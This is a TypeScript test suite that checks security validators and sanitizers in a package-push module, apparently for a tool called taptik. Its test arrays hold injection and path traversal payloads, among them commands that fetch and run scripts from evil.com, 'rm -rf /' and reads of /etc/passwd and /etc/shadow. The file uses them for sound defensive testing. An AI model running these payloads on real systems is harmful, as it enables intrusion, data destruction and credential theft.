import * as crypto from 'crypto';
import * as fs from 'fs/promises';
import * as os from 'os';
import * as path from 'path';
import { describe, it, expect, beforeEach, afterEach } from 'vitest';

import { PackageValidatorService } from '../services/package-validator.service';
import { SanitizationService } from '../services/sanitization.service';
import { SecurityValidatorService } from '../services/security-validator.service';

describe('Push Module Security Tests', () => {
  let tempDir: string;
  let securityValidator: SecurityValidatorService;
  let sanitizer: SanitizationService;
  let packageValidator: PackageValidatorService;

  beforeEach(async () => {
    tempDir = path.join(os.tmpdir(), 'taptik-security-test', Date.now().toString());
    await fs.mkdir(tempDir, { recursive: true });

    securityValidator = new SecurityValidatorService();
    sanitizer = new SanitizationService();
    packageValidator = new PackageValidatorService();
  });

  afterEach(async () => {
    try {
      await fs.rm(tempDir, { recursive: true, force: true });
    } catch {
      // Ignore
    }
  });

  describe('Injection Attack Prevention', () => {
    it('should detect SQL injection attempts', () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM passwords --",
        "1; DELETE FROM packages WHERE '1'='1",
      ];

      sqlInjectionPayloads.forEach(payload => {
        const result = securityValidator.validateInput(payload, 'userInput');
        expect(result.isValid).toBe(false);
        expect(result.issues.some(i => i.type === 'INJECTION_ATTEMPT')).toBe(true);
        expect(result.riskLevel).toMatch(/high|critical/);
      });
    });

    it('should detect JavaScript injection attempts', () => {
      const jsInjectionPayloads = [
        '<script>alert("XSS")</script>',
        'javascript:alert(1)',
        'onerror=alert(1)',
        'eval("malicious code")',
        'require("child_process").exec("rm -rf /")',
        '__proto__.isAdmin = true',
        'constructor.prototype.isAdmin = true',
      ];

      jsInjectionPayloads.forEach(payload => {
        const result = securityValidator.validateInput(payload, 'userInput');
        expect(result.isValid).toBe(false);
        expect(result.issues.length).toBeGreaterThan(0);
      });
    });

    it('should detect command injection attempts', () => {
      const cmdInjectionPayloads = [
        '`rm -rf /`',
        '$(curl evil.com/shell.sh | sh)',
        '| cat /etc/passwd',
        '&& wget evil.com/malware',
        '; shutdown -h now',
      ];

      cmdInjectionPayloads.forEach(payload => {
        const result = securityValidator.validateInput(payload, 'userInput');
        expect(result.isValid).toBe(false);
        expect(result.riskLevel).toMatch(/high|critical/);
      });
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should detect path traversal attempts', () => {
      const pathTraversalPayloads = [
        '../../etc/passwd',
        '../../../windows/system32/config/sam',
        '..\\..\\..\\boot.ini',
        '/etc/shadow',
        'C:\\Windows\\System32\\config\\SAM',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f',
      ];

      pathTraversalPayloads.forEach(payload => {
        const result = securityValidator.validateFilePath(payload);
        expect(result.isValid).toBe(false);
        expect(result.issues.some(i => i.type === 'PATH_TRAVERSAL')).toBe(true);
        expect(result.riskLevel).toMatch(/medium|high|critical/);
      });
    });

    it('should allow safe relative paths', () => {
      const safePaths = [
        'src/modules/push/index.ts',
        './package.json',
        'node_modules/express/index.js',
        '.taptik/config.json',
      ];

      safePaths.forEach(safePath => {
        const result = securityValidator.validateFilePath(safePath);
        // Should not have critical issues
        expect(result.riskLevel).not.toBe('critical');
      });
    });
  });

  describe('Sensitive Data Detection', () => {
    it('should detect and remove API keys', async () => {
      const packageWithKeys = {
        name: 'test-package',
        config: {
          apiKey: 'sk-1234567890abcdef',
          githubToken: 'ghp_1234567890abcdef',
          awsAccessKey: 'AKIA1234567890ABCDEF',
          googleApiKey: 'AIzaSyA-1234567890abcdef',
          stripeKey: 'sk_live_1234567890abcdef',
        },
      };

      const buffer = Buffer.from(JSON.stringify(packageWithKeys));
      const result = await sanitizer.sanitizePackage(
        buffer,
        'test.taptik',
        { requiresSanitization: true } as any
      );

      const sanitized = JSON.parse(result.sanitized.toString());
      
      expect(result.report.removedCount).toBeGreaterThan(0);
      expect(sanitized.config.apiKey).toBeUndefined();
      expect(sanitized.config.githubToken).toBeUndefined();
      expect(sanitized.config.awsAccessKey).toBeUndefined();
      expect(sanitized.config.googleApiKey).toBeUndefined();
      expect(sanitized.config.stripeKey).toBeUndefined();
    });

    it('should detect and remove passwords', async () => {
      const packageWithPasswords = {
        name: 'test-package',
        database: {
          password: 'secretPassword123!',
          passwd: 'anotherPassword',
          pwd: 'shortPwd',
          dbPassword: 'databasePass',
        },
        config: {
          userPassword: 'userPass123',
          adminPassword: 'adminPass456',
        },
      };

      const buffer = Buffer.from(JSON.stringify(packageWithPasswords));
      const result = await sanitizer.sanitizePackage(
        buffer,
        'test.taptik',
        { requiresSanitization: true } as any
      );

      const sanitized = JSON.parse(result.sanitized.toString());
      
      expect(result.report.removedCount).toBeGreaterThan(0);
      expect(sanitized.database.password).toBeUndefined();
      expect(sanitized.database.passwd).toBeUndefined();
      expect(sanitized.database.pwd).toBeUndefined();
      expect(sanitized.config.userPassword).toBeUndefined();
    });

    it('should detect and remove email addresses', async () => {
      const packageWithEmails = {
        name: 'test-package',
        author: {
          email: 'user@example.com',
          personalEmail: 'personal@gmail.com',
          workEmail: 'work@company.com',
        },
        contacts: [
          'contact1@example.com',
          'contact2@example.org',
        ],
      };

      const buffer = Buffer.from(JSON.stringify(packageWithEmails));
      const result = await sanitizer.sanitizePackage(
        buffer,
        'test.taptik',
        { requiresSanitization: true } as any
      );

      const sanitized = JSON.parse(result.sanitized.toString());
      
      expect(result.report.removedCount).toBeGreaterThan(0);
      expect(result.report.classifications).toContain('safe-with-warnings');
    });

    it('should detect SSH keys and certificates', async () => {
      const packageWithKeys = {
        name: 'test-package',
        sshKey: '-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----',
        certificate: '-----BEGIN CERTIFICATE-----\nMIIFazCCA1OgAwIBAgIUH...\n-----END CERTIFICATE-----',
      };

      const buffer = Buffer.from(JSON.stringify(packageWithKeys));
      const result = await sanitizer.sanitizePackage(
        buffer,
        'test.taptik',
        { requiresSanitization: true } as any
      );

      const sanitized = JSON.parse(result.sanitized.toString());
      
      expect(result.report.removedCount).toBeGreaterThan(0);
      expect(sanitized.sshKey).toBeUndefined();
      expect(sanitized.certificate).toBeUndefined();
    });
  });

  describe('Malicious Content Detection', () => {
    it('should detect executable file signatures', () => {
      // Windows PE executable
      const peHeader = Buffer.from([0x4D, 0x5A]); // MZ
      let result = securityValidator.detectMaliciousContent(peHeader);
      expect(result.isValid).toBe(false);
      expect(result.issues.some(i => i.type === 'EXECUTABLE_CONTENT')).toBe(true);

      // Linux ELF executable
      const elfHeader = Buffer.from([0x7F, 0x45, 0x4C, 0x46]); // .ELF
      result = securityValidator.detectMaliciousContent(elfHeader);
      expect(result.isValid).toBe(false);
      expect(result.riskLevel).toBe('critical');

      // Java class file
      const javaHeader = Buffer.from([0xCA, 0xFE, 0xBA, 0xBE]);
      result = securityValidator.detectMaliciousContent(javaHeader);
      expect(result.isValid).toBe(false);

      // Shell script
      const shebang = Buffer.from('#!/bin/sh\nrm -rf /');
      result = securityValidator.detectMaliciousContent(shebang);
      expect(result.isValid).toBe(false);
    });

    it('should detect suspicious file extensions', () => {
      const suspiciousFiles = [
        'malware.exe',
        'script.bat',
        'hack.sh',
        'virus.vbs',
        'trojan.jar',
        'backdoor.dll',
      ];

      suspiciousFiles.forEach(file => {
        const result = securityValidator.validateFilePath(file);
        expect(result.issues.some(i => i.type === 'SUSPICIOUS_FILENAME')).toBe(true);
        expect(result.riskLevel).toMatch(/medium|high/);
      });
    });

    it('should detect high entropy (potential encryption/obfuscation)', () => {
      // Create high entropy data (random bytes)
      const highEntropyData = crypto.randomBytes(1024);
      const result = securityValidator.detectMaliciousContent(highEntropyData);
      
      expect(result.issues.some(i => 
        i.type === 'SUSPICIOUS_METADATA' && 
        i.message.includes('entropy')
      )).toBe(true);
    });
  });

  describe('Input Validation', () => {
    it('should reject oversized inputs', () => {
      const largeString = 'a'.repeat(20000); // Exceeds 10000 char limit
      const result = securityValidator.validateInput(largeString, 'userInput');
      
      expect(result.isValid).toBe(false);
      expect(result.issues.some(i => i.type === 'OVERSIZED_INPUT')).toBe(true);
    });

    it('should reject deeply nested objects', () => {
      let deepObject: any = { level: 0 };
      let current = deepObject;
      
      // Create object with depth > 10
      for (let i = 1; i <= 15; i++) {
        current.nested = { level: i };
        current = current.nested;
      }

      const result = securityValidator.validateInput(deepObject, 'userInput');
      
      expect(result.isValid).toBe(false);
      expect(result.issues.some(i => i.type === 'OVERSIZED_INPUT')).toBe(true);
    });

    it('should detect null bytes in strings', () => {
      const stringWithNullByte = 'normal\x00malicious';
      const result = securityValidator.validateInput(stringWithNullByte, 'userInput');
      
      expect(result.isValid).toBe(false);
      expect(result.issues.some(i => i.type === 'INJECTION_ATTEMPT')).toBe(true);
    });

    it('should detect control characters', () => {
      const stringWithControlChars = 'text\x07\x08\x0B\x0C';
      const result = securityValidator.validateInput(stringWithControlChars, 'userInput');
      
      expect(result.issues.some(i => i.type === 'INVALID_ENCODING')).toBe(true);
    });
  });

  describe('Package Integrity', () => {
    it('should validate package checksums', async () => {
      const packageContent = JSON.stringify({
        name: 'test-package',
        version: '1.0.0',
      });

      const packagePath = path.join(tempDir, 'test.taptik');
      await fs.writeFile(packagePath, packageContent);

      // Calculate checksum
      const checksum = await packageValidator.calculateChecksum(packagePath);
      expect(checksum).toBeDefined();
      expect(checksum).toHaveLength(64); // SHA256 hex

      // Modify file
      await fs.appendFile(packagePath, 'tampered');
      
      // Recalculate checksum
      const newChecksum = await packageValidator.calculateChecksum(packagePath);
      expect(newChecksum).not.toBe(checksum);
    });

    it('should detect tampered packages', async () => {
      const originalContent = JSON.stringify({
        name: 'test-package',
        version: '1.0.0',
        checksum: 'original-checksum',
      });

      const packagePath = path.join(tempDir, 'tampered.taptik');
      await fs.writeFile(packagePath, originalContent);

      // Calculate original checksum
      const originalChecksum = await packageValidator.calculateChecksum(packagePath);

      // Tamper with the file
      const tamperedContent = originalContent.replace('1.0.0', '2.0.0');
      await fs.writeFile(packagePath, tamperedContent);

      // Calculate new checksum
      const tamperedChecksum = await packageValidator.calculateChecksum(packagePath);

      // Checksums should differ
      expect(tamperedChecksum).not.toBe(originalChecksum);
    });
  });

  describe('Access Control', () => {
    it('should validate user permissions', () => {
      const mockUser = {
        id: 'user-123',
        email: 'user@example.com',
        tier: 'free',
      };

      const mockPackage = {
        userId: 'user-456', // Different user
        isPublic: false,
      };

      // User should not have access to another user's private package
      const hasAccess = mockUser.id === mockPackage.userId || mockPackage.isPublic;
      expect(hasAccess).toBe(false);
    });

    it('should enforce tier-based limits', () => {
      const freeTierLimits = {
        maxPackageSize: 10 * 1024 * 1024, // 10MB
        maxUploadsPerDay: 100,
        maxBandwidthPerDay: 1024 * 1024 * 1024, // 1GB
      };

      const proTierLimits = {
        maxPackageSize: 100 * 1024 * 1024, // 100MB
        maxUploadsPerDay: 1000,
        maxBandwidthPerDay: 10 * 1024 * 1024 * 1024, // 10GB
      };

      // Test free tier
      expect(freeTierLimits.maxPackageSize).toBeLessThan(proTierLimits.maxPackageSize);
      expect(freeTierLimits.maxUploadsPerDay).toBeLessThan(proTierLimits.maxUploadsPerDay);
      expect(freeTierLimits.maxBandwidthPerDay).toBeLessThan(proTierLimits.maxBandwidthPerDay);
    });
  });
});